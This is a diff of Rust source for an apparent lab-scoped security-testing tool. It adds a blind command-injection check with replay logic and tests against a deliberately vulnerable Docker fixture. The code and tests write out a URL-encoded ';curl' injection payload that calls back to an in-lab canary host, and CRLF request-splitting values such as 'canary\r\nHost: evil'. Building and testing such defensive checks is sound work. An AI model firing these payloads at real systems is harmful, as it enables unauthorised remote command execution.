@@ -968,6 +968,13 @@ pub(crate) const HTTP_SSTI_VANTAGE: &str = "http_ssti_vantage";
 /// (observed at the canary, #65), not in the probe's response. The string follows
 /// the `http_<technique>_vantage` family for the canonical JSON.
 pub(crate) const HTTP_SSRF_VANTAGE: &str = "http_ssrf_vantage";
+/// Blind OS command injection (#87): the same out-of-band canary witness as SSRF,
+/// but the coercion is a command injection at `/exec`, not a URL parameter. The
+/// injected command fetches the canary, and the token in the canary's logs is the
+/// witness; the probe's own response carries nothing (that is what "blind" means),
+/// so this is NOT on the body-marker seam. The in-band command injection (#85) is
+/// `HTTP_CMDI_VANTAGE` above; this is its out-of-band twin.
+pub(crate) const HTTP_BLIND_CMDI_VANTAGE: &str = "http_blind_cmdi_vantage";
 
 /// Observe whether an HTTP request to `target` from the attacker's vantage returns
 /// the `marker` that witnesses the technique succeeded. It is the shared seam under
@@ -1907,6 +1914,306 @@ pub(crate) async fn replay_ssrf_probe(
                 reason: format!("environment declares no canary workload {canary_alias:?}"),
             })?;
         ssrf_exploit_from(
+            docker,
+            net,
+            &scoped,
+            &canary_alias,
+            canary_port,
+            canary_container,
+            &token,
+            timeout,
+        )
+        .await
+        .map(|(observation, _draft)| observation)
+    }
+    .await;
+    if let Err(e) = lab.teardown().await {
+        eprintln!("redstep: teardown after a replay also failed: {e}");
+    }
+    probed
+}
+
+/// The blind command-injection coercion, as the `request_path` sent to the cmdi
+/// target's `/exec`: a benign token, then a shell-injected `curl` that fetches the
+/// in-lab canary at `/{token}`. URL-encoded so the `;`, the spaces and the inner
+/// URL survive as a single `cmd` query value in the wget request line (the `:` and
+/// `/` are left literal, as the in-band `CMDI_INJECTION` does; both are valid query
+/// bytes). Pure, so the exact path both [`blind_cmdi_exploit_from`] and the replay
+/// tamper-check build is testable offline, and they cannot drift. The witness is
+/// OUT-OF-BAND (the token at the canary), so there is no in-band marker and the
+/// marker-in-path forgery rule does not apply; the token legitimately appears in
+/// the path, because it is the callback URL the injected command fetches.
+fn blind_cmdi_coercion_path(canary_alias: &str, canary_port: u16, token: &str) -> String {
+    format!("/exec?cmd=x%3Bcurl%20-s%20http://{canary_alias}:{canary_port}/{token}")
+}
+
+/// Fail-closed check that an assembled out-of-band coercion `request_path` cannot
+/// re-aim the outer request's authority or split its request line (RK-015): it must
+/// start with `/` (so the literal `/exec` prefix, not a crafted component, fixes the
+/// outer authority) and contain no CR or LF (so a crafted `canary_alias` cannot
+/// inject a second request line). Lifted out of [`blind_cmdi_exploit_from`] as a
+/// pure function so this scope-relevant guard is pinned by an offline test on every
+/// gate, not only by the Docker-gated exploit path (where a dropped check would ship
+/// green). Parallel to the inline check in `ssrf_exploit_from`; #75 unifies them.
+fn blind_cmdi_path_is_safe(request_path: &str) -> bool {
+    request_path.starts_with('/') && !request_path.contains('\r') && !request_path.contains('\n')
+}
+
+/// Coerce `app` (the command-injection target) from the attacker vantage to run an
+/// injected OS command that fetches `http://{canary_alias}:{canary_port}/{token}`,
+/// then witness the request OUT-OF-BAND in the canary's logs, exactly as
+/// [`ssrf_exploit_from`] does for SSRF (#87, ADR-0023). The one difference is the
+/// coercion: a command injection at `/exec` ([`blind_cmdi_coercion_path`]), not a
+/// URL parameter, so a target that actually runs the injected `curl` is the
+/// witness. The probe's own response carries nothing about the callback (that is
+/// what "blind" means), so this is a separate path from the body-marker seam, like
+/// SSRF.
+///
+/// It reuses the shared, content-free out-of-band primitives rather than refactoring
+/// the shipped SSRF path: `validate_ssrf_token` (the token is untrusted on the
+/// replay path and an empty one would false-witness), `run_probe_capturing`, the
+/// bounded canary-log poll (`SSRF_CANARY_POLL_*`, so a hit still propagating is not
+/// read as a confident not-reached), `classify_ssrf` (the pure out-of-band
+/// classifier, which carries no SSRF-specific text), and `read_container_logs`. The
+/// draft is [`blind_cmdi_draft`], stamped `HTTP_BLIND_CMDI_VANTAGE` and attributed
+/// to `app`. Keeping this parallel to `ssrf_exploit_from` (rather than generalizing
+/// it) leaves the reviewed SSRF witness path untouched and gives #75 its second
+/// concrete out-of-band caller to unify.
+// allow(too_many_arguments): each argument is a distinct probe input, parallel to
+// `ssrf_exploit_from`; the probe-inputs reshape (#75) groups them.
+#[allow(clippy::too_many_arguments)]
+pub(crate) async fn blind_cmdi_exploit_from(
+    docker: &Docker,
+    vantage: &LabNetwork,
+    app: &ScopedTarget,
+    canary_alias: &str,
+    canary_port: u16,
+    canary_container: &str,
+    token: &str,
+    timeout: Duration,
+) -> Result<(Observation<bool>, EvidenceDraft)> {
+    // Fail-closed on a weak token before it reaches the injected URL or the
+    // `contains` check, exactly as the SSRF path: an empty/short token would
+    // false-witness, and this fronts the replay path where the token is untrusted.
+    validate_ssrf_token(token)?;
+    let request_path = blind_cmdi_coercion_path(canary_alias, canary_port, token);
+    // Fail-closed validation of the interpolated path, as the SSRF coercion does
+    // (RK-015). `canary_alias` is the one component not already constrained (the
+    // token is validated above, the port is a u16), so `blind_cmdi_path_is_safe`
+    // rejects CR/LF (a crafted alias injecting a second request line) and checks the
+    // literal `/exec` prefix. The marker-in-path check does not apply (the token is
+    // in the path by design, and the witness is at the canary).
+    if !blind_cmdi_path_is_safe(&request_path) {
+        return Err(Error::InvalidTarget {
+            spec: request_path,
+            reason:
+                "the blind command-injection coercion path must start with '/' and contain no CR or LF"
+                    .to_owned(),
+        });
+    }
+    let secs = timeout.as_secs().max(1);
+    let applied = Duration::from_secs(secs);
+    let url = format!("http://{}:{}{}", app.host(), app.port(), request_path);
+    let cmd = wget_cmd(&url, secs, &[]);
+    let (state, _body, headers) = run_probe_capturing(
+        docker,
+        vantage.name(),
+        cmd,
+        applied + Duration::from_secs(5),
+    )
+    .await?;
+    // The witness is out-of-band, so poll the canary's logs over the bounded window
+    // (see SSRF_CANARY_POLL_ATTEMPTS for why a single read would risk a false PASS),
+    // returning as soon as the token appears.
+    let mut seen = false;
+    for attempt in 0..SSRF_CANARY_POLL_ATTEMPTS {
+        let (canary_out, canary_err) = read_container_logs(docker, canary_container).await?;
+        if canary_out.contains(token) || canary_err.contains(token) {
+            seen = true;
+            break;
+        }
+        if attempt + 1 < SSRF_CANARY_POLL_ATTEMPTS {
+            tokio::time::sleep(SSRF_CANARY_POLL_INTERVAL).await;
+        }
+    }
+    let observation = classify_ssrf(&state, seen, response_was_redirected(&headers));
+    let spec = format!("{}:{}", app.host(), app.port());
+    let draft = blind_cmdi_draft(
+        vantage.segment(),
+        spec,
+        &request_path,
+        token,
+        canary_alias,
+        canary_port,
+        &observation,
+        applied,
+    );
+    Ok((observation, draft))
+}
+
+/// Compose the evidence draft for a blind command-injection probe. Parallel to
+/// [`ssrf_draft`]: the `target` is the coerced app, NOT the canary (the canary is
+/// only the observation point, so the finding is attributed to the app and the
+/// canary lives solely in the reproduction params, #65/#87, ADR-0023).
+/// Confidence-first summary, like `http_witness_draft`, so a `true` can never read
+/// sub-`High`. A separate function from `ssrf_draft` (rather than parameterizing it
+/// by capability and summary) keeps the shipped SSRF path untouched; #75 unifies
+/// the two out-of-band drafts.
+// allow(too_many_arguments): each argument is a distinct draft input, parallel to
+// `ssrf_draft`; kept flat until the #75 reshape.
+#[allow(clippy::too_many_arguments)]
+fn blind_cmdi_draft(
+    segment: &str,
+    target_spec: String,
+    request_path: &str,
+    token: &str,
+    canary_alias: &str,
+    canary_port: u16,
+    observation: &Observation<bool>,
+    applied: Duration,
+) -> EvidenceDraft {
+    let summary = if observation.confidence != Confidence::High {
+        "the probe did not complete cleanly; the result is inconclusive".to_owned()
+    } else if observation.value {
+        format!(
+            "the target ran an injected command that reached the canary with token {token:?}; \
+             the blind command injection succeeded"
+        )
+    } else {
+        "the target did not reach the canary; this injection did not exploit it".to_owned()
+    };
+    EvidenceDraft {
+        capability: HTTP_BLIND_CMDI_VANTAGE,
+        target: target_spec.clone(),
+        intensity: Intensity::Controlled,
+        observed: serde_json::Value::Bool(observation.value),
+        confidence: observation.confidence,
+        summary,
+        source: Some(NodeRef::Vantage {
+            segment: segment.to_owned(),
+        }),
+        reproduction: Reproduction {
+            capability: HTTP_BLIND_CMDI_VANTAGE.to_owned(),
+            target: target_spec,
+            params: serde_json::json!({
+                "request_path": request_path,
+                "token": token,
+                "canary_alias": canary_alias,
+                "canary_port": canary_port,
+                "vantage_segment": segment,
+                "timeout_ms": applied.as_millis() as u64,
+            }),
+        },
+    }
+}
+
+/// The env-independent replay inputs parsed from a blind command-injection witness:
+/// the segment, the target (the app), the coercion request path, the token, the
+/// canary alias and port, and the applied timeout. The witness fields are identical
+/// to an SSRF witness's (the out-of-band family shares them), so this is parallel to
+/// [`parse_ssrf_witness`]; it is a separate fail-closed parser rather than a shared
+/// one so the shipped SSRF parse stays untouched, and #75 unifies them (the
+/// identical fields make that clean). Pure and Docker-free, fail-closed on a
+/// missing/ill-typed field or a non-blind-cmdi capability (ADR-0022).
+// allow(type_complexity): the parsed replay inputs are a flat tuple parallel to
+// `parse_ssrf_witness`; a named struct is the same #75 reshape, not now.
+#[allow(clippy::type_complexity)]
+fn parse_blind_cmdi_witness(
+    witness: &Reproduction,
+) -> Result<(String, String, String, String, String, u16, Duration)> {
+    let invalid = |reason: &str| Error::InvalidTarget {
+        spec: witness.target.clone(),
+        reason: reason.to_owned(),
+    };
+    if witness.target.is_empty() {
+        return Err(invalid("replay witness has an empty target"));
+    }
+    if witness.capability != HTTP_BLIND_CMDI_VANTAGE {
+        return Err(invalid(
+            "replay witness is not a blind command-injection witness",
+        ));
+    }
+    let str_param = |key: &str, reason: &'static str| {
+        witness
+            .params
+            .get(key)
+            .and_then(|v| v.as_str())
+            .filter(|s| !s.trim().is_empty())
+            .map(str::to_owned)
+            .ok_or_else(|| invalid(reason))
+    };
+    let segment = str_param("vantage_segment", "replay witness has no vantage_segment")?;
+    let request_path = str_param("request_path", "replay witness has no request_path")?;
+    let token = str_param("token", "replay witness has no token")?;
+    let canary_alias = str_param("canary_alias", "replay witness has no canary_alias")?;
+    let canary_port = witness
+        .params
+        .get("canary_port")
+        .and_then(|v| v.as_u64())
+        .filter(|p| *p <= u16::MAX as u64)
+        .ok_or_else(|| invalid("replay witness has no canary_port"))? as u16;
+    let timeout_ms = witness
+        .params
+        .get("timeout_ms")
+        .and_then(|v| v.as_u64())
+        .ok_or_else(|| invalid("replay witness has no timeout_ms"))?;
+    Ok((
+        segment,
+        witness.target.clone(),
+        request_path,
+        token,
+        canary_alias,
+        canary_port,
+        Duration::from_millis(timeout_ms),
+    ))
+}
+
+/// Replay a blind command-injection witness against `env` (ADR-0022, #87),
+/// parallel to [`replay_ssrf_probe`]: reconstruct the coercion the witness records,
+/// bring `env` up fresh, re-run it, and return the raw `Observation`. The canary's
+/// container name is resolved from the fresh lab by the witnessed `canary_alias`
+/// (per-run, not in the witness), so a replay reaches the right canary. The app
+/// target is re-resolved through `Scope::from_environment(env)` so a replay cannot
+/// aim outside scope, and the lab is always torn down. It refuses a witness whose
+/// `request_path` does not re-derive from its recorded canary and token, so a
+/// tampered witness cannot replay a different injection than the one recorded.
+// allow(dead_code): no M1 production caller, like the other replays; the loop guard
+// exercises it under cfg(test).
+#[allow(dead_code)]
+pub(crate) async fn replay_blind_cmdi_probe(
+    docker: &Docker,
+    env: &Environment,
+    witness: &Reproduction,
+) -> Result<Observation<bool>> {
+    let (segment, target, request_path, token, canary_alias, canary_port, timeout) =
+        parse_blind_cmdi_witness(witness)?;
+    let scoped = Scope::from_environment(env).resolve(&target)?;
+    // Reproduce the recorded coercion, not a freshly-built one: the witnessed
+    // request_path must be the one this canary and token regenerate, else the
+    // witness was tampered and the replay would verify a different injection than
+    // the one recorded (ADR-0022). `blind_cmdi_coercion_path` is the one builder
+    // both the exploit and this check use, so a mismatch is refused here.
+    let expected_path = blind_cmdi_coercion_path(&canary_alias, canary_port, &token);
+    if request_path != expected_path {
+        return Err(Error::InvalidTarget {
+            spec: request_path,
+            reason: "replay witness request_path does not match its recorded canary and token"
+                .to_owned(),
+        });
+    }
+
+    let lab = bring_up(docker, env).await?;
+    let probed = async {
+        let net = vantage_network(&lab, &segment)?;
+        let canary_container = lab
+            .containers()
+            .iter()
+            .find(|c| c.workload() == canary_alias)
+            .map(|c| c.name())
+            .ok_or_else(|| Error::LabUnavailable {
+                reason: format!("environment declares no canary workload {canary_alias:?}"),
+            })?;
+        blind_cmdi_exploit_from(
             docker,
             net,
             &scoped,
@@ -6149,6 +6456,648 @@ mod tests {
                 verdict,
                 crate::Verdict::Pass,
                 "the #65 check passes against the fixed lab"
+            );
+        });
+    }
+
+    /// A per-probe token for the blind command-injection Docker tests (#87). Like
+    /// `SSRF_TOKEN`, a fixed value the manual probes and the recorded witness reuse;
+    /// the capability under test mints its own via `ssrf_token`. URL-safe and >=8
+    /// chars so `validate_ssrf_token` admits it and `logs.contains` is specific.
+    const BLIND_CMDI_TOKEN: &str = "redstep-blindcmdi-witness-4c2d";
+    /// The positive-control token for the blind command-injection Docker tests: a
+    /// DIRECT vantage->canary hit carries it, proving the canary records on the lab,
+    /// so an absent witness token is "not reached", not a dead canary (RK-016).
+    const BLIND_CMDI_CONTROL_TOKEN: &str = "redstep-blindcmdi-control-8a3e";
+
+    /// Guard: the cmdi fixture image installs an HTTP client (curl), which the BLIND
+    /// variant of the check (#87) depends on to make the target call back to the
+    /// canary. The blind check's end-to-end behaviour is otherwise exercised only by
+    /// the self-skipping Docker tests, so without this offline anchor, removing curl
+    /// from the Dockerfile would silently disarm the blind check on every non-opt-in
+    /// gate (RK-014, CLAUDE.md row 6). `include_str!` resolves the Dockerfile across
+    /// the `exclude = ["playground"]` boundary at compile time. The assertion keys on
+    /// the `apt-get install` LINE, not any mention of curl, so a comment that happens
+    /// to say "curl" cannot stand in for the install. Mutation: drop the `apt-get
+    /// install ... curl` line from `playground/cmdi/Dockerfile` -> this fails.
+    #[test]
+    fn blind_cmdi_image_carries_a_http_client() {
+        let dockerfile = include_str!("../../../playground/cmdi/Dockerfile");
+        let installs_curl = dockerfile
+            .lines()
+            .any(|l| l.contains("apt-get install") && l.contains("curl"));
+        assert!(
+            installs_curl,
+            "the cmdi Dockerfile must install curl so the blind command-injection \
+             callback can reach the canary (#87); without it the blind check silently \
+             stops working off the Docker-gated tests (RK-014)"
+        );
+    }
+
+    /// Guard: `blind_cmdi_coercion_path` builds the actual injection the check relies
+    /// on, a URL-encoded shell-injected `curl` that fetches the canary at `/{token}`.
+    /// The replay tamper-check uses this SAME builder for both the recorded and the
+    /// expected path, so a mutation to the template moves both sides together and the
+    /// Docker loop cannot catch it (RK-003 symmetry); only this offline literal pin
+    /// does, and on every gate rather than opt-in Docker (RK-014). Pure, no Docker.
+    /// Mutation: drop the `%3B` (the injecting `;`), the `curl`, or the token from the
+    /// template -> the matching assertion fails.
+    #[test]
+    fn blind_cmdi_coercion_path_injects_a_callback_curl() {
+        let path = blind_cmdi_coercion_path("canary", 8082, "tok12345");
+        assert_eq!(
+            path, "/exec?cmd=x%3Bcurl%20-s%20http://canary:8082/tok12345",
+            "the coercion injects a URL-encoded `;curl -s http://<canary>:<port>/<token>` at /exec"
+        );
+        // Each piece is load-bearing for the callback: the injecting semicolon (%3B
+        // ends `echo x` and starts a new command), the HTTP client, and the token.
+        assert!(path.starts_with("/exec?cmd="));
+        assert!(
+            path.contains("%3B") && path.contains("curl"),
+            "the path injects a new command (%3B) that runs curl: {path:?}"
+        );
+        assert!(
+            path.contains("tok12345"),
+            "the token is the callback target: {path:?}"
+        );
+    }
+
+    /// Guard: the blind command-injection draft attributes the witness to the coerced
+    /// app (`target`), not the canary (the observation point): the canary lives only
+    /// in the reproduction params (#87, ADR-0023, parallel to the SSRF draft). Pure,
+    /// no Docker. Mutation: set the draft's `target` to the canary alias -> the
+    /// `target` assertion fails; change the stamped capability -> the capability
+    /// assertion fails.
+    #[test]
+    fn blind_cmdi_draft_attributes_the_witness_to_the_target_not_the_canary() {
+        let observation = Observation {
+            value: true,
+            confidence: Confidence::High,
+        };
+        let draft = blind_cmdi_draft(
+            "lab",
+            "cmdi:8083".to_owned(),
+            "/exec?cmd=x%3Bcurl%20-s%20http://canary:8082/tok12345",
+            "tok12345",
+            "canary",
+            8082,
+            &observation,
+            Duration::from_millis(5_000),
+        );
+        assert_eq!(
+            draft.target, "cmdi:8083",
+            "the finding is attributed to the app"
+        );
+        assert_eq!(draft.reproduction.target, "cmdi:8083");
+        assert_eq!(
+            draft.source,
+            Some(NodeRef::Vantage {
+                segment: "lab".to_owned()
+            })
+        );
+        // The canary is only a reproduction param, never the target or source.
+        assert_eq!(draft.reproduction.params["canary_alias"], "canary");
+        assert_eq!(draft.reproduction.params["canary_port"], 8082);
+        assert_eq!(draft.capability, "http_blind_cmdi_vantage");
+        assert_eq!(draft.observed, serde_json::Value::Bool(true));
+        assert_eq!(draft.confidence, Confidence::High);
+        assert!(
+            draft.summary.contains("blind command injection succeeded")
+                && draft.summary.contains("tok12345"),
+            "the summary names the token and the success: {:?}",
+            draft.summary
+        );
+    }
+
+    /// Guard: a blind command-injection witness round-trips through
+    /// `parse_blind_cmdi_witness`, and a witness missing any field (or carrying a
+    /// non-blind-cmdi capability) is rejected fail-closed (ADR-0022). The capability
+    /// case is the one that keeps the blind replay from running an SSRF witness's
+    /// coercion. Pure, no Docker. Mutation: drop a field's check -> the matching
+    /// `rejected` case parses -> fails; drop the capability guard -> the SSRF witness
+    /// parses -> fails.
+    #[test]
+    fn parse_blind_cmdi_witness_round_trips_and_rejects_an_incomplete_witness() {
+        let observation = Observation {
+            value: true,
+            confidence: Confidence::High,
+        };
+        let draft = blind_cmdi_draft(
+            "lab",
+            "cmdi:8083".to_owned(),
+            "/exec?cmd=x%3Bcurl%20-s%20http://canary:8082/tok12345",
+            "tok12345",
+            "canary",
+            8082,
+            &observation,
+            Duration::from_millis(5_000),
+        );
+        let (segment, target, request_path, token, alias, port, timeout) =
+            parse_blind_cmdi_witness(&draft.reproduction)
+                .expect("a complete blind cmdi witness parses");
+        assert_eq!(segment, "lab");
+        assert_eq!(target, "cmdi:8083");
+        assert_eq!(
+            request_path,
+            "/exec?cmd=x%3Bcurl%20-s%20http://canary:8082/tok12345"
+        );
+        assert_eq!(token, "tok12345");
+        assert_eq!(alias, "canary");
+        assert_eq!(port, 8082);
+        assert_eq!(timeout, Duration::from_millis(5_000));
+
+        let without = |key: &str| {
+            let mut params = draft.reproduction.params.clone();
+            params.as_object_mut().unwrap().remove(key);
+            Reproduction {
+                capability: HTTP_BLIND_CMDI_VANTAGE.to_owned(),
+                target: "cmdi:8083".to_owned(),
+                params,
+            }
+        };
+        assert!(
+            parse_blind_cmdi_witness(&without("token")).is_err(),
+            "a witness with no token is rejected"
+        );
+        assert!(
+            parse_blind_cmdi_witness(&without("canary_alias")).is_err(),
+            "a witness with no canary_alias is rejected"
+        );
+        assert!(
+            parse_blind_cmdi_witness(&without("canary_port")).is_err(),
+            "a witness with no canary_port is rejected"
+        );
+        assert!(
+            parse_blind_cmdi_witness(&without("vantage_segment")).is_err(),
+            "a witness with no vantage_segment is rejected"
+        );
+        assert!(
+            parse_blind_cmdi_witness(&without("request_path")).is_err(),
+            "a witness with no request_path is rejected"
+        );
+        let not_blind_cmdi = Reproduction {
+            capability: HTTP_SSRF_VANTAGE.to_owned(),
+            target: "cmdi:8083".to_owned(),
+            params: draft.reproduction.params.clone(),
+        };
+        assert!(
+            parse_blind_cmdi_witness(&not_blind_cmdi).is_err(),
+            "a non-blind-cmdi (here SSRF) witness is rejected"
+        );
+    }
+
+    /// Guard: `blind_cmdi_path_is_safe` rejects an assembled coercion path that could
+    /// re-aim the outer request's authority or split its request line (RK-015). The
+    /// live vector is a `canary_alias` carrying CR/LF; the leading-`/` half backs the
+    /// literal `/exec` prefix. This is a scope-relevant guard, and before it was lifted
+    /// into a pure function the only thing exercising it was the Docker-gated exploit
+    /// path, which default-skips, so a dropped check shipped green on the offline gate.
+    /// Pure, no Docker. Mutation: make `blind_cmdi_path_is_safe` return `true`
+    /// unconditionally -> the CR/LF and leading-`/` cases pass -> this fails.
+    #[test]
+    fn blind_cmdi_path_is_safe_rejects_a_reaiming_or_splitting_path() {
+        // A normal coercion from constrained inputs is safe.
+        assert!(blind_cmdi_path_is_safe(&blind_cmdi_coercion_path(
+            "canary", 8082, "tok12345"
+        )));
+        // A canary alias carrying CR/LF would split the outer request line, even though
+        // the alias reaches the path only in the query.
+        assert!(!blind_cmdi_path_is_safe(&blind_cmdi_coercion_path(
+            "canary\r\nHost: evil",
+            8082,
+            "tok12345"
+        )));
+        assert!(!blind_cmdi_path_is_safe(&blind_cmdi_coercion_path(
+            "canary\nGET /x",
+            8082,
+            "tok12345"
+        )));
+        // A path that does not start with '/' cannot rely on the literal prefix to fix
+        // the outer authority.
+        assert!(!blind_cmdi_path_is_safe("exec?cmd=x"));
+    }
+
+    /// Guard: `blind_cmdi_draft` mirrors the observation in the NON-exploit and the
+    /// abnormal directions, which the attribution test (only `value:true`/`High`) does
+    /// not reach; those summary branches were otherwise dead on the offline gate
+    /// (RK-011 in both directions). Pure, no Docker. Mutation: freeze `confidence:
+    /// observation.confidence` to `Confidence::High` -> the Low case fails; replace the
+    /// non-exploit or inconclusive summary text -> the matching `contains` fails.
+    #[test]
+    fn blind_cmdi_draft_mirrors_a_non_exploit_and_an_inconclusive_observation() {
+        let clean = blind_cmdi_draft(
+            "lab",
+            "cmdi:8083".to_owned(),
+            "/exec?cmd=x",
+            "tok12345",
+            "canary",
+            8082,
+            &Observation {
+                value: false,
+                confidence: Confidence::High,
+            },
+            Duration::from_millis(5_000),
+        );
+        assert_eq!(clean.observed, serde_json::Value::Bool(false));
+        assert_eq!(clean.confidence, Confidence::High);
+        assert!(
+            clean.summary.contains("did not reach the canary"),
+            "a clean non-exploit summary: {:?}",
+            clean.summary
+        );
+        let inconclusive = blind_cmdi_draft(
+            "lab",
+            "cmdi:8083".to_owned(),
+            "/exec?cmd=x",
+            "tok12345",
+            "canary",
+            8082,
+            &Observation {
+                value: false,
+                confidence: Confidence::Low,
+            },
+            Duration::from_millis(5_000),
+        );
+        assert_eq!(inconclusive.confidence, Confidence::Low);
+        assert!(
+            inconclusive.summary.contains("inconclusive"),
+            "an abnormal-probe summary: {:?}",
+            inconclusive.summary
+        );
+    }
+
+    /// Guard: `replay_blind_cmdi_probe` refuses a witness whose `request_path` does not
+    /// re-derive from its recorded canary and token, so a tampered witness cannot
+    /// replay a different injection than the one recorded (ADR-0022). The tamper-check
+    /// sits before `bring_up`, so it is reachable with no daemon (the `Docker` handle
+    /// is lazy and never used here). Mutation: change the `request_path != expected_path`
+    /// guard in `replay_blind_cmdi_probe` to `false` -> the tampered witness is accepted
+    /// and the replay proceeds past the check -> this (expecting `Err`) fails.
+    #[test]
+    fn replay_blind_cmdi_probe_refuses_a_tampered_witness() {
+        let draft = blind_cmdi_draft(
+            "lab",
+            "cmdi:8083".to_owned(),
+            &blind_cmdi_coercion_path("canary", 8082, "tok12345"),
+            "tok12345",
+            "canary",
+            8082,
+            &Observation {
+                value: true,
+                confidence: Confidence::High,
+            },
+            Duration::from_millis(5_000),
+        );
+        let mut witness = draft.reproduction;
+        // Tamper: a request_path that does not re-derive from canary+token (the token
+        // in the path is DIFFERENT, not tok12345).
+        witness.params.as_object_mut().unwrap().insert(
+            "request_path".to_owned(),
+            serde_json::json!("/exec?cmd=x%3Bcurl%20-s%20http://canary:8082/DIFFERENT"),
+        );
+        let env = Environment::builder()
+            .segment("lab")
+            .vantage("lab")
+            .service("cmdi", "redstep/cmdi:mvp", "lab")
+            .service("canary", "redstep/canary:mvp", "lab")
+            .build()
+            .expect("the cmdi+canary environment is valid");
+        let docker = Docker::connect_with_local_defaults().expect("lazy connect");
+        let result = block_on(replay_blind_cmdi_probe(&docker, &env, &witness));
+        assert!(
+            matches!(result, Err(Error::InvalidTarget { .. })),
+            "a tampered witness whose request_path does not re-derive must be refused before bring_up (got Ok: {})",
+            result.is_ok()
+        );
+    }
+
+    /// Guard (Docker; self-skips without a Linux daemon or the built images): the
+    /// native BLIND command-injection check verdicts `Fail` against the vulnerable
+    /// cmdi fixture, with the ADR-0009 blind diagnostic, and the witness is
+    /// OUT-OF-BAND (#87). The attacker injects a command that makes the cmdi target
+    /// `curl` the in-lab canary; the canary records the token; the target's OWN
+    /// response never carries it. A positive control (a direct vantage->canary hit)
+    /// proves the canary witnesses on this lab. RK-011: the draft mirrors the
+    /// observation, is tagged `http_blind_cmdi_vantage`, and is attributed to the app
+    /// (`target`), not the canary. Mutation: neutralise the mvp `/exec` to an
+    /// arg-vector (the fix) so the injected `curl` is an inert literal argument -> no
+    /// callback -> the verdict assertion fails.
+    #[test]
+    fn blind_command_injection_check_flags_the_playground() {
+        if !linux_docker_available() {
+            eprintln!(
+                "skipping blind_command_injection_check_flags_the_playground: no Linux Docker daemon"
+            );
+            return;
+        }
+        for image in ["redstep/cmdi:mvp", "redstep/canary:mvp"] {
+            if !image_present(image) {
+                eprintln!(
+                    "skipping blind_command_injection_check_flags_the_playground: image {image} absent (run playground/build.sh)"
+                );
+                return;
+            }
+        }
+        block_on(async {
+            let docker = Docker::connect_with_local_defaults().expect("connect to Docker");
+            let env = Environment::builder()
+                .segment("lab")
+                .vantage("lab")
+                .service("cmdi", "redstep/cmdi:mvp", "lab")
+                .service("canary", "redstep/canary:mvp", "lab")
+                .build()
+                .expect("the cmdi+canary environment is valid");
+
+            let lab = bring_up(&docker, &env)
+                .await
+                .expect("bring up the cmdi+canary fixture (readiness-gated)");
+            let vantage = lab
+                .networks()
+                .iter()
+                .find(|n| n.segment() == "lab")
+                .expect("the lab network")
+                .clone();
+            let canary_container = lab
+                .containers()
+                .iter()
+                .find(|c| c.workload() == "canary")
+                .map(|c| c.name().to_owned())
+                .expect("the canary container");
+
+            let scope = Scope::from_environment(&env);
+            let target = scope.resolve("cmdi:8083").expect("cmdi is in scope");
+
+            let ctx =
+                crate::TestContext::new_in_lab(scope.clone(), docker.clone(), vantage.clone());
+            let recorded = ctx
+                .exploit_blind_command_injection_from_vantage(
+                    &target,
+                    SSRF_CANARY_ALIAS,
+                    SSRF_CANARY_PORT,
+                    &canary_container,
+                )
+                .await
+                .expect("the vantage blind command-injection probe ran");
+            let observed = recorded.observation.value;
+            let confidence = recorded.observation.confidence;
+            let verdict = ctx.expect(&recorded).to_be(false);
+
+            // The cmdi target's OWN response never carries the token: the witness is
+            // the callback at the canary, not anything in the /exec body (blind).
+            let coerce =
+                blind_cmdi_coercion_path(SSRF_CANARY_ALIAS, SSRF_CANARY_PORT, BLIND_CMDI_TOKEN);
+            let exec_url = format!("http://{}:{}{}", target.host(), target.port(), coerce);
+            let (_s, exec_body, _h) = run_probe_capturing(
+                &docker,
+                vantage.name(),
+                wget_cmd(&exec_url, 5, &[]),
+                Duration::from_secs(10),
+            )
+            .await
+            .expect("the /exec probe ran");
+
+            // Positive control: a direct vantage->canary hit is recorded, so the
+            // canary witnesses on this lab (an absent token means not reached, not a
+            // dead canary).
+            let control_url =
+                format!("http://{SSRF_CANARY_ALIAS}:{SSRF_CANARY_PORT}/{BLIND_CMDI_CONTROL_TOKEN}");
+            let _ = run_probe_capturing(
+                &docker,
+                vantage.name(),
+                wget_cmd(&control_url, 5, &[]),
+                Duration::from_secs(10),
+            )
+            .await
+            .expect("the direct canary probe ran");
+            let (canary_out, _canary_err) = read_container_logs(&docker, &canary_container)
+                .await
+                .expect("read the canary logs");
+
+            let judgements = ctx.take_judgements();
+            let drafts = ctx.take_evidence_drafts();
+            let _ = lab.teardown().await;
+
+            assert_eq!(
+                verdict,
+                crate::Verdict::Fail,
+                "the vulnerable cmdi fixture is a security FAIL"
+            );
+            assert!(
+                observed,
+                "the injected command ran and reached the canary (out-of-band witness)"
+            );
+            assert!(
+                !exec_body.contains(BLIND_CMDI_TOKEN),
+                "the cmdi target's own response does not carry the token: the body alone would not show the blind injection: {exec_body:?}"
+            );
+            assert!(
+                canary_out.contains(BLIND_CMDI_CONTROL_TOKEN),
+                "positive control: a direct hit is recorded, so the canary witnesses on this lab"
+            );
+            let (judgement, _) = &judgements[0];
+            assert_eq!(judgement.verdict, crate::Verdict::Fail);
+            let diagnostic = judgement
+                .diagnostic
+                .as_ref()
+                .expect("a FAIL carries a diagnostic");
+            assert!(
+                diagnostic.probable_cause.contains(SSRF_CANARY_ALIAS)
+                    && diagnostic.probable_cause.contains("command"),
+                "the domain cause names the callback host and the command: {:?}",
+                diagnostic.probable_cause
+            );
+            assert!(
+                diagnostic.remediation.contains("argument vector"),
+                "the domain remediation names the arg-vector fix: {:?}",
+                diagnostic.remediation
+            );
+            // RK-011: the draft mirrors the observation, is tagged
+            // http_blind_cmdi_vantage, and is attributed to the app, not the canary.
+            assert_eq!(drafts[0].capability, "http_blind_cmdi_vantage");
+            assert_eq!(drafts[0].observed, serde_json::Value::Bool(observed));
+            assert_eq!(drafts[0].confidence, confidence);
+            assert_eq!(
+                drafts[0].target, "cmdi:8083",
+                "the witness is attributed to the app, not the canary"
+            );
+            assert_eq!(
+                drafts[0].source,
+                Some(NodeRef::Vantage {
+                    segment: "lab".to_owned()
+                })
+            );
+        });
+    }
+
+    /// Guard (Docker; self-skips without a Linux daemon or the built images,
+    /// including `redstep/cmdi:fixed`): the blind command-injection attack-to-defense
+    /// loop closes (#87), parallel to the SSRF loop. A genuine blind injection is
+    /// recorded against the vulnerable cmdi fixture and its own witness is replayed
+    /// against two fresh labs: it reproduces the callback against the vulnerable image
+    /// and is not-exploitable, confidently, against the arg-vector `redstep/cmdi:fixed`.
+    /// TWO positive controls close RK-016 in both directions a "no callback" could be
+    /// vacuous: a direct canary hit proves the canary still records (not a dead
+    /// canary), and a benign `/exec` on the fixed lab still returns the echoed input
